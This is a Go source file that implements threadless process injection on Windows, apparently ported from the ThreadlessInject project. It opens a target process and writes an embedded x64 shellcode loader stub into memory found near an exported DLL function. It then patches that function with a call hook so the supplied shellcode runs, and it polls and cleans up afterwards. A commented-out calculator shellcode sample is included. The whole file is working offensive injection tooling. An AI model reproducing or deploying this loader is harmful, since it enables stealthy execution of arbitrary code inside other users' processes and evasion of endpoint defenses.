//go:build windows
// +build windows

// Original repository : https://github.com/CCob/ThreadlessInject

package loader

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"time"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

var shellcode []byte
var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
	VirtualFreeEx        = kernel32.NewProc("VirtualFreeEx")
	VirtualProtectEx     = kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
	ReadProcessMemory    = kernel32.NewProc("ReadProcessMemory")
	CreateRemoteThreadEx = kernel32.NewProc("CreateRemoteThreadEx")

	oldProtect = windows.PAGE_READWRITE
	callOpCode = []byte{0xe8, 0, 0, 0, 0}
	uintsize   = unsafe.Sizeof(uintptr(0))

	//calc
	// shellcode = []byte{
	// 	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
	// 	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
	// 	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
	// 	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	// 	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
	// 	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
	// 	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
	// 	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
	// 	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3,
	// }

	shellcodeLoader = []byte{
		0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
		0xE0, 0x90,
	}

	// payload     []byte
	// payloadSize int

	payload     = append(shellcodeLoader, shellcode...)
	payloadSize = len(payload)
)

func GenerateHook(originalBytes []byte) {
	// Overwrite dummy 0x887766.. instructions in loader to restore original bytes of the hooked function
	for i := 0; i < len(originalBytes); i++ {
		// shellcodeLoader[0x12 + i] = originalBytes[i]
		payload[0x12+i] = originalBytes[i]
	}
	// fmt.Printf("[+] DEBUG - Loader : %x\n", payload)
}

func FindMemoryHole(pHandle, exportAddress, size uintptr) (uintptr, error) {
	remoteLoaderAddress := uintptr(0)
	found := false

	for remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000; remoteLoaderAddress < exportAddress+0x70000000; remoteLoaderAddress += 0x10000 {
		fmt.Printf("[+] Trying address : @%x\n", remoteLoaderAddress)
		_, _, errVirtualAlloc := VirtualAllocEx.Call(
			uintptr(pHandle),
			remoteLoaderAddress,
			uintptr(size),
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_READWRITE),
		)
		if errVirtualAlloc == nil || errVirtualAlloc.Error() == "The operation completed successfully." {
			found = true
			fmt.Printf("[+] Successfully allocated : @%x\n", remoteLoaderAddress)
			break
		}
	}

	if !found {
		return 0, fmt.Errorf("[-]Could not find memory hole")
	}

	return remoteLoaderAddress, nil
}

func Threadlessinect(pid uint32, data []byte, function string, dll string) {
	// pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
	// function := flag.String("fct", "", "Remote function to hook")
	// dll := flag.String("dll", "", "DLL in which the remote function is located")
	//flag.Parse()

	// Get handle to remote process
	shellcode = data
	pHandle, errOpenProcess := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid)

	if errOpenProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess : %s\r\n", errOpenProcess.Error()))
	}

	// Get address of remote function to hook (GetModuleHandle + LoadLibrary under the hood)
	DLL := windows.NewLazySystemDLL(dll)
	remote_fct := DLL.NewProc(function)
	exportAddress := remote_fct.Addr()

	// fmt.Printf("[+] DEBUG - Export address: %x\n", exportAddress)

	loaderAddress, holeErr := FindMemoryHole(uintptr(pHandle), exportAddress, uintptr(payloadSize))
	if holeErr != nil {
		log.Fatal(fmt.Sprintf("[!]Error finding memory hole : %s\r\n", holeErr.Error()))
	}

	var originalBytes []byte = make([]byte, 8)
	// Read original bytes of the remote function
	_, _, errReadFunction := ReadProcessMemory.Call(
		uintptr(pHandle),
		exportAddress,
		uintptr(unsafe.Pointer(&originalBytes[0])),
		uintptr(len(originalBytes)))
	if errReadFunction != nil && errReadFunction.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error monitoring function :%s\r\n", errReadFunction.Error()))
	}

	// fmt.Printf("[+] DEBUG - Original bytes: 0x%x\n", originalBytes)

	// Write function original bytes to loader, so it can restore after one-time execution
	GenerateHook(originalBytes)

	// Unprotect remote function memory
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(
		uintptr(pHandle),
		exportAddress,
		8,
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)))

	var relativeLoaderAddress = (uint32)((uint64)(loaderAddress) - ((uint64)(exportAddress) + 5))
	relativeLoaderAddressArray := make([]byte, uintsize)
	binary.LittleEndian.PutUint32(relativeLoaderAddressArray, relativeLoaderAddress)
	// fmt.Printf("[+] DEBUG - Relative loader address: %x\n", relativeLoaderAddress)

	callOpCode[1] = relativeLoaderAddressArray[0]
	callOpCode[2] = relativeLoaderAddressArray[1]
	callOpCode[3] = relativeLoaderAddressArray[2]
	callOpCode[4] = relativeLoaderAddressArray[3]

	// fmt.Printf("[+] DEBUG - callOpCode : 0x%x\n", callOpCode)

	// Hook the remote function
	_, _, errWriteHook := WriteProcessMemory.Call(
		uintptr(pHandle),
		exportAddress,
		(uintptr)(unsafe.Pointer(&callOpCode[0])),
		uintptr(len(callOpCode)))
	if errWriteHook != nil && errWriteHook.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!] Failed to hook the function :%s\r\n", errWriteHook.Error()))
	}
	// fmt.Printf("[+] DEBUG - bytesRead : %d\n", bytesRead)

	newBytes := make([]byte, uintsize)
	binary.LittleEndian.PutUint64(newBytes, uint64(exportAddress))
	// fmt.Printf("[+] DEBUG - newBytes : %x\n", newBytes)

	// Unprotect loader allocated memory
	_, _, errVirtualProtectEx = VirtualProtectEx.Call(
		uintptr(pHandle),
		loaderAddress,
		uintptr(payloadSize),
		windows.PAGE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error protecting payload memory:%s\r\n", errVirtualProtectEx.Error()))
	}

	// Write loader to allocated memory
	_, _, errWriteLoader := WriteProcessMemory.Call(
		uintptr(pHandle),
		loaderAddress,
		(uintptr)(unsafe.Pointer(&payload[0])),
		uintptr(payloadSize))
	if errWriteLoader != nil && errWriteLoader.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error writing loader:%s\r\n", errWriteLoader.Error()))
	}

	// Protect loader allocated memory
	_, _, errVirtualProtectEx = VirtualProtectEx.Call(
		uintptr(pHandle),
		loaderAddress,
		uintptr(payloadSize),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error protecting loader :%s\r\n", errVirtualProtectEx.Error()))
	}

	fmt.Println("[+] Shellcode injected, waiting 60s for the hook to be called...")

	delay := 60 * time.Second
	var endTime <-chan time.Time
	endTime = time.After(delay)

	executed := false
	for {
		select {
		case <-endTime:
			fmt.Println("[+] Done")
			return
		default:
			read := 0
			var buf []byte = make([]byte, 8)

			_, _, errReadFunction := ReadProcessMemory.Call(
				uintptr(pHandle),
				exportAddress,
				uintptr(unsafe.Pointer(&buf[0])),
				uintptr(len(buf)),
				uintptr(unsafe.Pointer(&read)))
			if errReadFunction != nil && errReadFunction.Error() != "The operation completed successfully." {
				log.Fatal(fmt.Sprintf("Error monitoring function :%s\r\n", errReadFunction.Error()))
			}
			// fmt.Println("[+] Monitoring...")
			// fmt.Printf("[+] Read bytes: %x\n", buf)
			// fmt.Printf("[+] Original bytes: %x\n", originalBytes)

			if bytes.Equal(buf, originalBytes) {
				fmt.Println("[+] Hook called")
				executed = true
				break
			}

			time.Sleep(1 * time.Second)
			continue
		}

		if executed {
			break
		}
	}

	if executed {
		fmt.Println("[+] Cleaning up")

		_, _, errVirtualProtectEx = VirtualProtectEx.Call(
			uintptr(pHandle),
			exportAddress,
			8,
			windows.PAGE_EXECUTE_READ,
			uintptr(unsafe.Pointer(&oldProtect)))
		if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
			log.Fatal(fmt.Sprintf("Error protecting back hooked function :%s\r\n", errVirtualProtectEx.Error()))
		}

		_, _, errVirtualFreeEx := VirtualFreeEx.Call(
			uintptr(pHandle),
			loaderAddress,
			0,
			windows.MEM_RELEASE)
		if errVirtualFreeEx != nil && errVirtualFreeEx.Error() != "The operation completed successfully." {
			log.Fatal(fmt.Sprintf("Error freeing payload memory space :%s\r\n", errVirtualFreeEx.Error()))
		}

	}

	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:%s\r\n", errCloseHandle.Error()))
	}

}
